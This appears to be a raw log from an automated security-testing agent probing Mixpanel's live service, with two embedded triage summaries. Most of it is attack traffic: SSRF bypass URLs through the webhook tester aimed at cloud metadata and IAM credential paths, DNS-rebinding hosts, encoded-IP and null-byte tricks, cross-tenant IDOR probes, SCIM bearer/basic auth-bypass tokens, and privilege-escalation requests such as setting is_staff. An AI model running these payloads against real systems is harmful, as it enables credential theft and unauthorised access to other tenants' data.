[18:45:31] ATTACK-SSRF-BYPASS: PROBE[redir-bin-imds-307] url=https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/&status_code=3 -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:45:32] ATTACK-SSRF-BYPASS: PROBE[redir-bin-gcp] url=https://httpbin.org/redirect-to?url=http://metadata.google.internal/computeMetadata/v1/ins -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:45:34] ATTACK-SSRF-BYPASS: PROBE[redir-bingo-imds] url=https://httpbingo.org/redirect-to?url=http://169.254.169.254/latest/meta-data/&status_code -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:45:36] ATTACK-SSRF-BYPASS: PROBE[redir-bin-localhost] url=https://httpbin.org/redirect-to?url=http://127.0.0.1/&status_code=302 -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:45:38] ATTACK-SSRF-BYPASS: PROBE[redir-nghttp2] url=https://nghttp2.org/httpbin/redirect-to?url=http://169.254.169.254/latest/meta-data/&statu -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:45:39] ATTACK-SSRF-BYPASS: PROBE[rbndr-pub-imds] url=http://7f000001.a9fea9fe.rbndr.us/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:45:45] ATTACK-SSRF-BYPASS: PROBE[rbndr-pub-imds-iam] url=http://7f000001.a9fea9fe.rbndr.us/latest/meta-data/iam/security-credentials/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:45:56] ATTACK-SSRF-BYPASS: PROBE[rbndr-cf-imds] url=http://01010101.a9fea9fe.rbndr.us/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[2026-05-30T18:45:58Z] RECON-ENDPOINTS:   deep secret scan: 6 unique findings (out of 34 raw)
[18:45:59] ATTACK-SSRF-BYPASS: PROBE[rbndr-goog-imds] url=http://08080808.a9fea9fe.rbndr.us/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:46:01] ATTACK-SSRF-BYPASS: PROBE[1ums-pub-imds] url=http://make-169.254.169.254-rr-1.1u.ms/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:46:07] ATTACK-SSRF-BYPASS: PROBE[1ums-make-imds] url=http://make.169.254.169.254.1u.ms/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:46:10] ATTACK-SSRF-BYPASS: PROBE[ldap-int] url=ldap://localhost:389/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: c1
[18:46:11] ATTACK-SSRF-BYPASS: PROBE[dict-redis] url=dict://127.0.0.1:6379/info -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: b2
[18:46:12] ATTACK-SSRF-BYPASS: PROBE[jar-imds] url=jar:http://169.254.169.254/latest/meta-data/!/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: ad
[18:46:14] ATTACK-SSRF-BYPASS: PROBE[netdoc-passwd] url=netdoc:///etc/passwd -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: e5
[18:46:14] ATTACK-SCIM: KNOWN GET /api/app/me/organizations/3100781 -> 404
[18:46:15] ATTACK-SSRF-BYPASS: PROBE[cidr-127-0-1-3] url=http://127.0.1.3/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:46:16] ATTACK-SCIM: KNOWN GET /api/2.0/org-secrets -> 400
[18:46:16] ATTACK-SCIM: KNOWN GET /api/2.0/org-secrets?organization_id=3100781 -> 400
[18:46:18] ATTACK-SSRF-BYPASS: PROBE[cidr-127-1-1-1] url=http://127.1.1.1/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:46:19] ATTACK-SCIM: KNOWN GET /api/2.0/orgs/3100781/scim -> 400
[18:46:19] ATTACK-SCIM: KNOWN GET /api/2.0/orgs/3100781/scim/tokens -> 400
[18:46:22] ATTACK-SCIM: KNOWN GET /api/2.0/organizations/3100781/scim -> 400
[18:46:23] ATTACK-SSRF-BYPASS: PROBE[octal-127] url=http://0177.0.0.1/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:46:24] ATTACK-SSRF-BYPASS: PROBE[nul-imds] url=http://169.254.169.254%00.example.com/latest/meta-data/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 65
[18:46:25] ATTACK-SSRF-BYPASS: PROBE[under-host] url=http://_imds.169.254.169.254.nip.io/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:46:26] ATTACK-SSRF-BYPASS: PROBE[ipv6-zone] url=http://[fe80::a9fe:a9fe%25eth0]/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "url: &#x27;http://[fe80::a9fe:a9fe%25eth0]/latest/meta-data/&#x27; is not a &#x27;uri&#x27;", "details": {"schema": {"format": "uri", "maxLength": 2083, "minLength": 1, "
[18:46:27] ATTACK-SSRF-BYPASS: PROBE[ipv4-zeropad] url=http://169.0254.0169.0254/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 58
[18:46:28] ATTACK-SSRF-BYPASS: PROBE[ipv6-mapped-rev] url=http://[::ffff:0a9fe:a9fe]/ -> 400 body[200]={"status": "error", "error": "url: &#x27;http://[::ffff:0a9fe:a9fe]/&#x27; is not a &#x27;uri&#x27;", "details": {"schema": {"format": "uri", "maxLength": 2083, "minLength": 1, "title": "", "type": "s
[18:46:30] ATTACK-SSRF-BYPASS: PROBE[mp-internal-1] url=http://mixpanel-api.internal/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:46:31] ATTACK-SSRF-BYPASS: PROBE[mp-internal-2] url=http://api.mixpanel.svc.cluster.local/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:46:34] ATTACK-SSRF-BYPASS: PROBE[mp-internal-3] url=http://consul.service.consul:8500/v1/kv/?recursive -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[2026-05-30T18:46:36Z] RECON-ENDPOINTS:   GET /api/app/projects -> 200 len=177 '{"status": "ok", "results": [{"id": 4025923, "name": "project 1 name"}, {"id": 4'
[18:46:37] ATTACK-SSRF-BYPASS: PROBE[k8s-api] url=https://kubernetes.default.svc/api/v1/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:46:38] ATTACK-SSRF-BYPASS: PROBE[actuator] url=http://localhost:8080/actuator/env -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:46:41] ATTACK-SSRF-BYPASS: PROBE[aws-instance-data] url=http://instance-data/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:46:42] ATTACK-SSRF-BYPASS: PROBE[aws-region-alias] url=http://imds.us-east-1.amazonaws.com/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:46:51] ATTACK-SSRF-BYPASS: PROBE[zero-host] url=http://0/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:46:53] ATTACK-SSRF-BYPASS: PROBE[ws-bs-userinfo] url=http://169.254.169.254%5C@webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/ws-bs -> 200 body[200]={"status": "ok", "results": {"success": true, "status_code": 200, "message": "Webhook responded with status 200"}}
[2026-05-30T18:46:53Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/annotations -> 200 len=31 '{"status": "ok", "results": []}'
[18:46:54] AUTHZ-AUDIT: Starting authz audit — run 1780159614, 19 read endpoints
[18:46:55] ATTACK-SSRF-BYPASS: PROBE[ipv6-prefix-trick] url=http://[64:ff9b::a9fe:a9fe]/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[2026-05-30T18:46:56Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/audit-logs -> 405 len=0 ''
[2026-05-30T18:46:58Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/behaviors -> 200 len=31 '{"status": "ok", "results": {}}'
[18:47:00] ATTACK-SSRF-BYPASS: PROBE[nat64-v2] url=http://[64:ff9b:1::a9fe:a9fe]/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:47:01] AUTHZ-AUDIT: A /api/app/projects/4025962/dashboards  admin=200/811  member=302/0  ctypeM=text/html; charset=utf-8  sig=!=  → DIFF
[18:47:01] ATTACK-SSRF-BYPASS: PROBE[ipv6-lo-port] url=http://[::1]:80/admin -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:47:01] ATTACK-SSRF-BYPASS: WROTE /home/hunter/new_agent/results/mixpanel/ssrf-bypass-v2-1780159621.json
[2026-05-30T18:47:01Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/boards -> 200 len=86 '{"status": "ok", "results": [{"id": 11207838, "title": "\\ud83c\\udf31 Starter Boa'
[2026-05-30T18:47:06Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/bookmarks -> 200 len=23487 '{"status": "ok", "results": [{"id": 90220699, "project_id": 4025923, "dashboard_'
[18:47:10] AUTHZ-AUDIT: A /api/app/projects/4027263/dashboards  admin=200/811  member=302/0  ctypeM=text/html; charset=utf-8  sig=!=  → DIFF
[18:47:13] AUTHZ-AUDIT: A /api/app/projects/4027269/dashboards  admin=200/811  member=302/0  ctypeM=text/html; charset=utf-8  sig=!=  → DIFF
[2026-05-30T18:47:14Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/cohorts -> 200 len=31 '{"status": "ok", "results": []}'
[18:47:17] AUTHZ-AUDIT: A /api/app/projects/4025923/dashboards  admin=200/811  member=200/794  ctypeM=application/json  sig=!=  → DIFF
[18:47:20] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/scim/v2/Users -> 404
[2026-05-30T18:47:22Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/custom_events -> 301 len=0 ''
[18:47:25] AUTHZ-AUDIT: A /api/app/projects/4025923/cohorts  admin=200/31  member=200/31  ctypeM=application/json  sig===  → MATCH
[18:47:27] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/scim/v2/Groups -> 404
[2026-05-30T18:47:28Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/custom_properties -> 200 len=3569 '{"status": "ok", "results": [{"customPropertyId": 5867414, "project": 4025923, "'
[18:47:30] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/scim/v2/ServiceProviderConfig -> 404
[2026-05-30T18:47:32Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/dashboards -> 200 len=811 '{"status": "ok", "results": [{"id": 11207838, "title": "\\ud83c\\udf31 Starter Boa'
[18:47:34] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/scim/v2/ResourceTypes/Users -> 404
[18:47:35] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/scim/v2/ResourceTypes/Groups -> 404
[18:47:35] AUTHZ-AUDIT: A /api/app/projects/4025923/bookmarks  admin=200/23487  member=200/23487  ctypeM=application/json  sig===  → MATCH
[18:47:36] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/scim/v2/Schemas -> 404
[18:47:38] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/api/scim/v2/Users -> 404
[18:47:41] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/v2/Users -> 404
[18:47:41] ATTACK-SCIM: ALT-PATH GET https://api.mixpanel.com/scim/v2/Users -> 404
[18:47:42] ATTACK-SCIM: ALT-PATH GET https://api.mixpanel.com/app/scim/v2/Users -> 404
[18:47:43] AUTHZ-AUDIT: A /api/app/projects/4025923/webhooks  admin=200/328  member=200/328  ctypeM=application/json  sig===  → MATCH
[18:47:47] AUTHZ-AUDIT: A /api/app/projects/4025923/lookup_tables  admin=404/82  member=404/82  ctypeM=application/json  sig===  → MEMBER-BLOCKED
[18:47:50] AUTHZ-AUDIT: A /api/app/projects/4025923/custom_alerts  admin=404/82  member=404/82  ctypeM=application/json  sig===  → MEMBER-BLOCKED
[18:47:52] AUTHZ-AUDIT: A /api/app/projects/4025923/service_accounts  admin=404/85  member=404/85  ctypeM=application/json  sig===  → MEMBER-BLOCKED
[18:47:52] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/scim/v2/Users -> 404
[18:47:53] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/scim/v2/Groups -> 404
[18:47:55] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/scim/v2/ServiceProviderConfig -> 404
[18:47:56] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/scim/v2/ResourceTypes/Users -> 404
[18:47:56] AUTHZ-AUDIT: A /api/app/projects/4025923/users  admin=404/74  member=404/74  ctypeM=application/json  sig===  → MEMBER-BLOCKED
[2026-05-30T18:47:58Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/experiments -> 200 len=31 '{"status": "ok", "results": []}'
[18:48:05] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/scim/v2/ResourceTypes/Groups -> 404
[2026-05-30T18:48:06Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/feature-flags -> 200 len=31 '{"status": "ok", "results": []}'
[18:48:06] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/scim/v2/Schemas -> 404
[18:48:07] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/api/scim/v2/Users -> 404
[18:48:08] ATTACK-SCIM: ALT-PATH GET https://mixpanel.com/v2/Users -> 404
[18:48:08] AUTHZ-AUDIT: A /api/app/projects/4025923/info  admin=404/73  member=404/73  ctypeM=application/json  sig===  → MEMBER-BLOCKED
[18:48:08] ATTACK-SCIM: ALT-PATH GET https://api.mixpanel.com/scim/v2/Users -> 404
[18:48:08] ATTACK-SCIM: ALT-PATH GET https://api.mixpanel.com/app/scim/v2/Users -> 404
[18:48:09] ATTACK-SCIM: AUTHBYPASS Authorization='Bearer ' -> 401
[18:48:10] ATTACK-SCIM: AUTHBYPASS Authorization='Bearer null' -> 401
[18:48:10] AUTHZ-AUDIT: A /api/app/projects/4025923/settings  admin=404/77  member=404/77  ctypeM=application/json  sig===  → MEMBER-BLOCKED

## ATTACK-IDOR FINAL TRIAGE — 2026-05-30

All 9 initial "flags" reviewed:

1. ADMIN→IDOR (4025942) cross-tenant: ALL endpoints 302→/request_access/?next=/ (correctly gated).
   The len=31086 responses were the request_access HTML page following the 302.

2. IDOR→ADMIN (4025923) cross-tenant: ALL endpoints 302→/request_access/?next=/ (correctly gated).

3. MEMBER→ADMIN (4025923): 200 with real data — INVESTIGATED. The MEMBER account
   (id 6492622) is itself a legitimate member of project 4025923. The webhook seen
   has creator_id=6492622 = MEMBER. The "Starter Board" with creator=Mixpanel is
   the per-project onboarding board (each ADMIN project has its own distinct one;
   4025923→11207838, 4025962→11208404, 4027263→11218827, 4027269→11218839).
   MEMBER → ADMIN's OTHER projects (4025962, 4027263, 4027269) → 302 correctly gated.
   MEMBER → IDOR (4025942) → 302 correctly gated.
   CONCLUSION: not cross-tenant. MEMBER has dual org membership (3100810 + 3100781).

4. Bypass-hit candidates (HPP, trailing slash, dot-slash, .json, version drift,
   header injection, JSON body project_id override): ALL returned 302 →
   /request_access/ on retest. The runner's "BYPASS-HIT" marker mistakenly
   followed the 302 and counted len>50 as a hit.

5. /api/2.0/ surface: GET /api/2.0/cohorts/list?project_id=4025942 (ADMIN session)
   returns 403 — Mixpanel correctly cross-checks the project_id query param against
   session permissions. Same for events, funnels, insights, jql, query/insights.

6. GraphQL discovery: /graphql, /api/graphql, /internal/graphql all 404 — Mixpanel
   does not expose GraphQL on these subdomains.

7. Project ID sweep (4025923-4027270): ADMIN session — 200 only on the 4 projects
   ADMIN legitimately owns (4025923, 4025962, 4027263, 4027269 — all len=811 = own
   Starter Board); all foreign IDs returned 302/404. No prediction-based leakage.

8. Org-scoped path discovery: /api/app/organizations/{oid}, /api/app/orgs/{oid},
   /api/2.0/organizations/{oid} ALL returned 404/400 even for ADMIN's own org.
   Org-scoped REST API not exposed on this surface (likely under different host or
   handled through project-scoped APIs only).

FINAL VERDICT: No cross-tenant IDOR found on the tested project-scoped or
org-scoped surface. Confidence < 0.40 → KILL all candidates.

Mixpanel's project-level access control is uniformly enforced via 302 redirect to
/request_access/?next=/ for non-member sessions, both on /api/app/projects/{pid}/*
REST routes and the /api/2.0/*?project_id= query-param surface (which returns 403).
Header injection (X-Project-Id, X-Org-Id, X-Tenant-Id, X-Workspace-Id), JSON-body
project_id override, HPP duplicate project_id params, path mutations (trailing
slash, dot-slash, semicolon, encoded slash, .json suffix), version drift
(/api/v0/, /api/v1/, /api/v2/, /api/internal/, /api/_internal/), and method
tampering (POST/PUT/PATCH with foreign IDs) all fail with the same 302.

False positives are written to memory/false-positives.md to prevent re-test.
[18:48:11] ATTACK-SCIM: AUTHBYPASS Authorization='Bearer undefined' -> 401
[18:48:12] ATTACK-SCIM: AUTHBYPASS Authorization='Bearer admin' -> 401
[18:48:14] AUTHZ-AUDIT: A /api/app/projects/4025923/secret  admin=404/75  member=404/75  ctypeM=application/json  sig===  → MEMBER-BLOCKED
[18:48:15] ATTACK-SSRF-BYPASS: == BYPASS-V3: dig 500-errors, multi-hop redirects, OAST DNS, shortener-as-redirect ==
[18:48:16] ATTACK-SSRF-BYPASS: PROBE[zp-0169] url=http://169.0254.0169.0254/latest/meta-data/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: fa
[18:48:17] ATTACK-SCIM: AUTHBYPASS Authorization='Bearer 0' -> 401
[18:48:18] ATTACK-SCIM: AUTHBYPASS Authorization='Basic Og==' -> 401
[18:48:19] AUTHZ-AUDIT: A /api/app/projects/4025923/api-key  admin=404/76  member=404/76  ctypeM=application/json  sig===  → MEMBER-BLOCKED
[18:48:19] ATTACK-SSRF-BYPASS: PROBE[zp-0xa9] url=http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:48:20] ATTACK-SCIM: AUTHBYPASS Authorization='Basic YWRtaW46YWRtaW4=' -> 401
[2026-05-30T18:48:21Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/integrations -> 405 len=0 ''
[18:48:22] ATTACK-SSRF-BYPASS: PROBE[zp-mixed-hex] url=http://0xa9fe.0xa9fe/latest/meta-data/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: c2
[18:48:23] ATTACK-SCIM: AUTHBYPASS Authorization='Basic c2NpbTpzY2lt' -> 401
[18:48:24] ATTACK-SCIM: AUTHBYPASS Authorization='Basic bWl4cGFuZWw6bWl4cGFuZWw=' -> 401
[18:48:25] ATTACK-SCIM: AUTHBYPASS Authorization='Bearer ' -> 401
[18:48:26] ATTACK-SCIM: AUTHBYPASS Authorization='Bearer' -> 401
[18:48:27] ATTACK-SCIM: AUTHBYPASS Authorization='Bearer service-account' -> 401
[18:48:27] AUTHZ-AUDIT: A /api/app/organizations/3100781  admin=404/73  member=404/73  ctypeM=application/json  sig===  → MEMBER-BLOCKED
[18:48:27] ATTACK-SCIM: AUTHBYPASS Authorization='Bearer test' -> 401
[18:48:30] ATTACK-SSRF-BYPASS: PROBE[zp-0xa9fe-decimal] url=http://0xa9fe.43518/latest/meta-data/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 34
[18:48:30] ATTACK-SCIM: AUTHBYPASS Authorization='Session' -> 400
[18:48:34] AUTHZ-AUDIT: A /api/app/organizations/3100781/members  admin=404/81  member=404/81  ctypeM=application/json  sig===  → MEMBER-BLOCKED
[18:48:34] ATTACK-SSRF-BYPASS: PROBE[zp-decimal-leadzero] url=http://02852039166/latest/meta-data/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 7e
[18:48:35] ATTACK-SSRF-BYPASS: PROBE[zp-9digit] url=http://2852039166/latest/meta-data/iam/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:48:37] ATTACK-SSRF-BYPASS: PROBE[zp-decimal-with-port] url=http://2852039166:80/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:48:38] AUTHZ-AUDIT: A /api/app/organizations/3100781/audit_logs  admin=404/84  member=404/84  ctypeM=application/json  sig===  → MEMBER-BLOCKED
[18:48:38] ATTACK-SSRF-BYPASS: PROBE[zp-5octets] url=http://169.254.169.254.1/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: e6
[18:48:41] AUTHZ-AUDIT: A /api/app/organizations/3100781/billing  admin=404/81  member=404/81  ctypeM=application/json  sig===  → MEMBER-BLOCKED
[18:48:41] AUTHZ-AUDIT: B1 — POST /api/app/projects/4025923/webhooks with cohort_id=1 dummy
[18:48:43] ATTACK-SCIM: SETTINGS GET /api/app/me -> 200
[18:48:44] AUTHZ-AUDIT: B1 member_post status=400 first200='{"status": "error", "error": "root: Additional properties are not allowed (&#x27;cohort_id&#x27; was unexpected)", "deta'
[18:48:44] AUTHZ-AUDIT: B2 — PATCH /api/app/me {is_staff:true}
[2026-05-30T18:48:44Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/metrics -> 200 len=31 '{"status": "ok", "results": {}}'
[18:48:51] ATTACK-SSRF-BYPASS: PROBE[zp-2octets] url=http://169.254/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[2026-05-30T18:48:51Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/playlists -> 200 len=31 '{"status": "ok", "results": []}'
[18:48:57] ATTACK-SSRF-BYPASS: PROBE[zp-3octets] url=http://169.254.43518/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}

### ATTACK-IDOR FINAL (2026-05-30T19:05Z) — CLEAN NEGATIVE
- 360 requests across 33 project-scoped paths + 18 org-scoped + 23-project sweep + 15 bypass variants + 8 header injections + 3 method tampers + 8 /api/2.0/ query overrides + 5 GraphQL probes
- All cross-tenant access uniformly returns 302 → /request_access/?next=/
- /api/2.0/* returns 403 on foreign project_id
- No header injection, body override, HPP, path mutation, version drift, or method tampering bypasses
- GraphQL is NOT exposed on mixpanel.com
- MEMBER actually IS a granted member of project 4025923 (created webhook there); apparent "privesc" reads of 4025923 are legitimate
- Project ID sweep: only owner sessions get 200; foreign IDs all 302
- Conclusion: project-scoped REST IDOR is solidly enforced — move on to other surfaces
[18:49:02] AUTHZ-AUDIT: B2 admin_patch=400  member_patch=400  member_pre==post sig: False
[18:49:02] AUTHZ-AUDIT: B3 — POST /api/app/organizations/3100781/users invite owner
[18:49:04] ATTACK-SSRF-BYPASS: PROBE[zp-empty-path] url=http://169.254.169.254 -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:49:05] AUTHZ-AUDIT: B3 member_post status=404 first200='{"status": "error", "error": "Not found: /api/app/organizations/3100781/users"}'
[18:49:05] AUTHZ-AUDIT: B4 — POST /api/app/projects/4025923/reset_api_key (MEMBER only, single probe)
[18:49:06] ATTACK-SSRF-BYPASS: PROBE[zp-mixed] url=http://0xA9.254.0251.0xfe/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:49:09] AUTHZ-AUDIT: B4 member_post status=404 first200='{"status": "error", "error": "Not found: /api/app/projects/4025923/reset_api_key"}'
[18:49:09] AUTHZ-AUDIT: C — header context manipulation
[18:49:10] ATTACK-SSRF-BYPASS: PROBE[nul-pre] url=http://169.254.169.254%00/latest/meta-data/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 93
[18:49:12] ATTACK-SSRF-BYPASS: PROBE[nul-mid] url=http://169.254.169.254/%00/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:49:13] ATTACK-SSRF-BYPASS: PROBE[nul-host-prefix] url=http://%00169.254.169.254/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: cd
[18:49:15] AUTHZ-AUDIT: C1 member=302 admin=200 sig_match=False
[18:49:15] AUTHZ-AUDIT: C2 member=302 ctype=text/html; charset=utf-8 is_html_login=False
[18:49:15] AUTHZ-AUDIT: Audit complete — saved /home/hunter/new_agent/results/mixpanel/authz-1780159614.json
[18:49:15] ATTACK-SSRF-BYPASS: PROBE[nul-after-host] url=http://webhook.site%00@169.254.169.254/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:49:16] ATTACK-SSRF-BYPASS: PROBE[nul-encoded-double] url=http://169.254.169.254%2500/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 1f
[2026-05-30T18:49:18Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/themes -> 403 len=79 '{"status": "error", "error": "Cannot use custom themes with your current plan"}'
[18:49:20] ATTACK-SSRF-BYPASS: PROBE[cr-host] url=http://169.254.169.254%0d/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 21
[18:49:21] ATTACK-SSRF-BYPASS: PROBE[lf-host] url=http://169.254.169.254%0a/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: b6
[2026-05-30T18:49:22Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/users/import -> 200 len=115 '{"status": "ok", "results": {"active": false, "role": null, "teams": [], "recent'
[18:49:23] ATTACK-SSRF-BYPASS: PROBE[tab-host] url=http://169.254.169.254%09/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 42
[2026-05-30T18:49:24Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/webhooks -> 200 len=328 '{"status": "ok", "results": [{"id": "3b82f560-d587-4b8f-9c71-f35ae4d092c8", "nam'
[2026-05-30T18:49:25Z] RECON-ENDPOINTS:   GET /api/app/projects/4025923/workspaces -> 403 len=68 '{"error": "Your plan does not support DataViews", "status": "error"}'
[18:49:25] ATTACK-SSRF-BYPASS: PROBE[space-host] url=http://169.254.169.254%20/ -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 6d
[18:49:28] ATTACK-SSRF-BYPASS: PROBE[crlf-meta-flavor] url=http://metadata.google.internal/computeMetadata/v1/instance/%0d%0aMetadata-Flavor:%20Googl -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:49:29] ATTACK-SSRF-BYPASS: PROBE[chain-httpbin-x2-imds] url=https://httpbin.org/redirect-to?url=https%3A%2F%2Fhttpbin.org%2Fredirect-to%3Furl%3Dhttp%2 -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[18:49:32] ATTACK-SSRF-BYPASS: PROBE[chain-30hop] url=https://httpbin.org/redirect/30 -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[2026-05-30T18:49:33Z] RECON-ENDPOINTS:   GET /api/app/scim/v2/Groups -> 401 len=130 '{"schemas": ["urn:ietf:params:scim:api:messages:2.0:Error"], "detail": "Only \\"B'
[18:49:34] ATTACK-SSRF-BYPASS: PROBE[rel-redirect-imds] url=https://httpbin.org/relative-redirect/1?Location=http://169.254.169.254/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
[2026-05-30T18:49:34Z] RECON-ENDPOINTS:   GET /api/app/scim/v2/ServiceProviderConfig -> 200 len=823 '{"schemas": ["urn:ietf:params:scim:schemas:core:2.0:ServiceProviderConfig"], "do'
[18:49:35] ATTACK-SSRF-BYPASS: PROBE[double-encode-imds] url=http://169.254.169.254%252Flatest%252Fmeta-data%252F -> 500 body[200]={   "status": "error",   "message": "An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: ab
[18:49:36] ATTACK-SCIM: ME GET ADMIN -> 200
[2026-05-30T18:49:36Z] RECON-ENDPOINTS:   GET /api/app/scim/v2/Users -> 401 len=130 '{"schemas": ["urn:ietf:params:scim:api:messages:2.0:Error"], "detail": "Only \\"B'
[18:49:38] ATTACK-SCIM: ME GET MEMBER -> 200
[18:49:38] ATTACK-SCIM: ME GET IDOR -> 200
[18:49:40] ATTACK-SSRF-BYPASS: PROBE[triple-slash-imds] url=http:///169.254.169.254/latest/meta-data/ -> 400 body[200]={"status": "error", "error": "Failed to send test webhook request"}
